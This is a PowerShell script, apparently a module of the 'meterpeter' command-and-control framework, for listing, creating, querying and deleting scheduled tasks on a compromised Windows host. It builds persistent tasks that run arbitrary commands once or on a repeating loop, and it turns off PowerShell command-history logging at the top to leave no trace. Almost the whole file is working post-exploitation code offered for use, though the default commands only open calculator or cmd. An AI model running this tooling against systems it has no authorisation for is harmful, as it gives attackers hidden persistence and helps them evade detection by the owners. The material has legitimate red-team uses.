﻿<#
.SYNOPSIS
   Manage remote schedule tasks

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: schtasks
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   Cmdlet of meterpeter C2 v2.10.13 release that
   allows users to manage remote schedule tasks.

.NOTES
   Warning: RunOnce and LoopExec parameters does not
   auto-delete the task name from tasklist in the end.
   Warning: The Task Duration parameter only accepts
   from 1 to 24 hours of schedule task restriction.

.Parameter Action
   Check, query, runOnce, loopExec, delete (default: check)

.Parameter TaskName
   The TaskName (default: MeterpeterC2)

.Parameter Interval
   Execute task after xx minuts (default: 10)

.Parameter Duration
   The task max duration in hours (default: 1)

.Parameter StartTime
   RunOnce param task start time (default: 13:45)

.Parameter Execute
   Command to execute (default: cmd /c start calc.exe)

.EXAMPLE
   PS C:\> .\SchTasks.ps1 -Action "check"
   List all schedule tasks

.EXAMPLE
   PS C:\> .\SchTasks.ps1 -Action "query" -TaskName "MeterpeterC2"
   List MeterpeterC2 task verbose information

.EXAMPLE
   PS C:\> .\SchTasks.ps1 -Action "LoopExec" -TaskName "MeterpeterC2" -Interval "10" -Duration "2" -Execute "cmd /c start cmd.exe"
   Create 'MeterpeterC2' task that executes cmd.exe every 10 minuts with a task max duration of 2 hours

.EXAMPLE
   PS C:\> .\SchTasks.ps1 -Action "RunOnce" -TaskName "MeterpeterC2" -StartTime "13:45" -Execute "cmd /c start cmd.exe"
   Create 'MeterpeterC2' task that executes cmd.exe at 13:45 Once

.EXAMPLE
   PS C:\> .\SchTasks.ps1 -Action "delete" -TaskName "MeterpeterC2"
   Delete 'MeterpeterC2' task

.INPUTS
   None. You cannot pipe objects into SchTasks.ps1

.OUTPUTS
   * Manage SKYNET schedule tasks.
     - List remote-host schedule tasks.

   TaskName                                                                      LastRunTime         NextRunTime        
   --------                                                                      -----------         -----------        
   OneDrive Reporting Task-S-1-5-21-303954997-3777458861-1701234188-1001         17/12/2022 22:30:30 18/12/2022 21:43:43
   OneDrive Standalone Update Task-S-1-5-21-303954997-3777458861-1701234188-1001 17/12/2022 21:56:56 18/12/2022 21:16:16
   Opera GX scheduled assistant Autoupdate 1626799046                            18/12/2022 17:37:37 19/12/2022 17:37:37
   Opera GX scheduled Autoupdate 1626218283                                      18/12/2022 15:38:38 19/12/2022 15:38:38
   AD RMS Rights Policy Template Management (Automated)                          30/11/1999 00:00:00 19/12/2022 03:54:54

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/meterpeter
#>


## CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$execute="cmd /c start calc.exe",
   [string]$TaskName="MeterpeterC2",
   [string]$StartTime='13:45',
   [string]$Action="Check",
   [int]$Interval='10',
   [int]$Duration='1'
)


$CmdletVersion = "v1.0.3"
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@SchTasks $CmdletVersion {SSA@RedTeam}"
write-host " * Manage $Env:COMPUTERNAME schedule tasks" -ForegroundColor Green


If($Action -iMatch 'Check')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List all schedule tasks

   .OUTPUTS
      * Manage SKYNET schedule tasks.
        - List remote-host schedule tasks.

      TaskName                                                                      LastRunTime         NextRunTime        
      --------                                                                      -----------         -----------        
      OneDrive Reporting Task-S-1-5-21-303954997-3777458861-1701234188-1001         17/12/2022 22:30:30 18/12/2022 21:43:43
      OneDrive Standalone Update Task-S-1-5-21-303954997-3777458861-1701234188-1001 17/12/2022 21:56:56 18/12/2022 21:16:16
      Opera GX scheduled assistant Autoupdate 1626799046                            18/12/2022 17:37:37 19/12/2022 17:37:37
      Opera GX scheduled Autoupdate 1626218283                                      18/12/2022 15:38:38 19/12/2022 15:38:38
      AD RMS Rights Policy Template Management (Automated)                          30/11/1999 00:00:00 19/12/2022 03:54:54
      Microsoft Compatibility Appraiser                                             18/12/2022 03:18:18 19/12/2022 04:56:56
      ScanForUpdates                                                                18/12/2022 03:28:28 19/12/2022 14:38:38
      WakeUpAndScanForUpdates                                                       30/11/1999 00:00:00 19/12/2022 09:58:58
      MapsUpdateTask                                                                18/12/2022 00:19:19 19/12/2022 01:27:27
      PrinterCleanupTask                                                            16/12/2022 14:51:51 15/01/2023 12:00:00
      Storage Tiers Optimization                                                    30/11/1999 00:00:00 18/12/2022 21:00:00
      LicenseAcquisition                                                            30/11/1999 00:00:00 19/12/2022 01:19:19
      RunUpdateNotificationMgr                                                      30/11/1999 00:00:00 19/12/2022 13:34:34
      Scheduled Start                                                               18/12/2022 13:49:49 19/12/2022 00:05:05
   #>

   write-host "   - List " -ForegroundColor Green -NoNewline
   write-host "remote-host schedule tasks."
   write-host "   => " -ForegroundColor Yellow -NoNewline
   write-host "exclude: " -ForegroundColor DarkGray -NoNewline
   write-host "OneDrive tasks`n"

   Get-ScheduledTask | ForEach-Object{
      Get-ScheduledTaskInfo $_ } | Where-Object{
         ( $_.NextRunTime -ne $null -and $_.TaskName -iNotMatch '^(OneDrive)' )
      }|Select-object TaskName,LastRunTime,NextRunTime |
   Format-Table -AutoSize | Out-File "$Env:TMP\schedule.txt"

   $check_tasks = Get-Content -Path "$Env:TMP\schedule.txt"
   If(-not($check_tasks))
   {
      write-host " x None schedule Task found in: $Env:COMPUTERNAME`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
      return
   }
   Else
   {
      Get-content -Path "$Env:TMP\schedule.txt"
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
   }
}


If($Action -iMatch 'Query')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display task verbose information

   .OUTPUTS
      * Manage SKYNET schedule tasks
        - MeterpeterC2 task verbose info.

      TaskName     LastRunTime         NextRunTime         NumberOfMissedRuns
      --------     -----------         -----------         ------------------
      MeterpeterC2 18/12/2022 22:55:55 18/12/2022 22:58:58                  0

      State       : Ready
      TaskName    : MeterpeterC2
      Author      : SKYNET\pedro
      Date        : 2022-12-18T22:46:09
      Uri         : \MeterpeterC2
      TaskPath    : \
      Description :
      Execute     : cmd /c start mspaint.exe
   #>

   write-host "   - $TaskName " -ForegroundColor Green -NoNewline
   write-host "task verbose info.`n"

   ## add execution cmdline to output table
   $Dwit = (Get-ScheduledTask "$TaskName" -EA SilentlyContinue).Actions.Arguments
   $Exec = (Get-ScheduledTask "$TaskName" -EA SilentlyContinue).Actions.Execute

   Get-ScheduledTask "$TaskName" -EA SilentlyContinue | Get-ScheduledTaskInfo |
      Select-Object TaskName,LastRunTime,NextRunTime,NumberOfMissedRuns |
   Format-Table -AutoSize | Out-File "$Env:TMP\schedule.txt"

   Get-ScheduledTask "$TaskName" -EA SilentlyContinue |
      Select-Object State,TaskName,Author,Date,Uri,TaskPath,Description,@{Name='Execute';Expression={"${Exec} ${Dwit}"}} |
   Format-List >> "$Env:TMP\schedule.txt"

   $check_tasks = Get-Content -Path "$Env:TMP\schedule.txt"
   If(-not($check_tasks))
   {
      write-host " x None schedule Task named '$TaskName' found in $Env:COMPUTERNAME`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
      return
   }
   Else
   {
      Get-content -Path "$Env:TMP\schedule.txt"
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
   }

}


If($Action -iMatch 'RunOnce')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create one schedule task [RunOnce]

   .OUTPUTS
      * Manage SKYNET schedule tasks
        - Creating 'MeterpeterC2' schedule task.
        - Running MeterpeterC2 task at 13:45 hours.

      SUCCESS: The scheduled task "MeterpeterC2" has successfully been created.

      Folder: \
      TaskName                                 Next Run Time          Status
      ======================================== ====================== ===============
      MeterpeterC2                             18/12/2022 13:45:00    Ready
   #>


   write-host "   - Creating " -ForegroundColor Green -NoNewline
   write-host "'$TaskName' schedule task."
   write-host "   - Running $TaskName task at $StartTime hours.`n" -ForegroundColor Yellow

   cmd /R schtasks /Create /SC ONCE /ST "$StartTime" /TN "$TaskName" /TR "$execute"
   cmd /R schtasks /Query /TN "$TaskName" > "$Env:TMP\schedule.txt"
   
   $check_tasks = Get-content -Path "$Env:TMP\schedule.txt"
   If(-not($check_tasks))
   {
      write-host " x Failed to create task in: $Env:COMPUTERNAME`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
      return
   }
   Else
   {
      Get-content -Path "$Env:TMP\schedule.txt"
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
   }

}


If($Action -iMatch 'LoopExec')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create one schedule task [LoopExec]

   .NOTES
      Task Duration parameter accepts from
      1 to 24 hours of schedule restriction.

   .OUTPUTS
      * Manage SKYNET schedule tasks
        - Creating 'MeterpeterC2' schedule task.
        - MeterpeterC2 task max duration of: 1 Hours

      SUCCESS: The scheduled task "MeterpeterC2" has successfully been created.

      Folder: \
      TaskName                                 Next Run Time          Status
      ======================================== ====================== ===============
      MeterpeterC2                             18/12/2022 23:19:00    Ready
   #>

   write-host "   - Creating " -ForegroundColor Green -NoNewline
   write-host "'$TaskName' schedule task."

   If($Duration -gt 9)
   {
      If($Duration -gt 24)
      {
         $Duration = "24"
         write-host "   - Error: " -ForegroundColor Red -NoNewline
         write-host "task max duration set to: " -NoNewline
         write-host "$Duration" -ForegroundColor Yellow -NoNewline
         write-host "hours.`n"
      }
      Else
      {
         write-host "   - $TaskName task max duration of: $Duration hours.`n" -ForegroundColor Yellow      
      }
      $Task_duration = "00"+"$Duration"+":00"
   }
   Else
   {
      $Task_duration = "000"+"$Duration"+":00"
      write-host "   - $TaskName task max duration of: $Duration hours.`n" -ForegroundColor Yellow
   }

   cmd /R schtasks /Create /SC minute /MO "$Interval" /TN "$TaskName" /TR "$execute" /DU "$Task_duration"
   cmd /R schtasks /Query /TN "$TaskName" > "$Env:TMP\schedule.txt"
   
   $check_tasks = Get-content -Path "$Env:TMP\schedule.txt"
   If(-not($check_tasks))
   {
      write-host " x Failed to create task in: $Env:COMPUTERNAME`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
      return
   }
   Else
   {
      Get-content -Path "$Env:TMP\schedule.txt"
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
   }

}


If($Action -iMatch 'Delete')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete one schedule task

   .OUTPUTS
      * Manage SKYNET schedule tasks
        - Deleting Remote 'MeterpeterC2' Task.

      SUCCESS: The scheduled task "MeterpeterC2" was successfully deleted.
   #>

   write-host "   - Deleting " -ForegroundColor Red -NoNewline
   write-host "Remote '$TaskName' Task.`n"

   ## Check if TaskName exists before go any further
   If((Get-ScheduledTask "$TaskName" -EA SilentlyContinue).TaskName -ieq $null)
   {
      write-host "   x Fail to find $TaskName task on $Env:COMPUTERNAME`n" -ForegroundColor Red
      return
   }

   cmd /R schtasks /Delete /tn "$TaskName" /f > "$Env:TMP\schedule.txt" 
   $check_tasks = Get-content -Path "$Env:TMP\schedule.txt"
   If(-not($check_tasks))
   {
      write-host "`n x None Task Named '$TaskName' found in $Env:COMPUTERNAME`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
      return
   }
   Else
   {
      Get-content -Path "$Env:TMP\schedule.txt"
      Remove-Item -Path "$Env:TMP\schedule.txt" -Force
   }  
}

write-host ""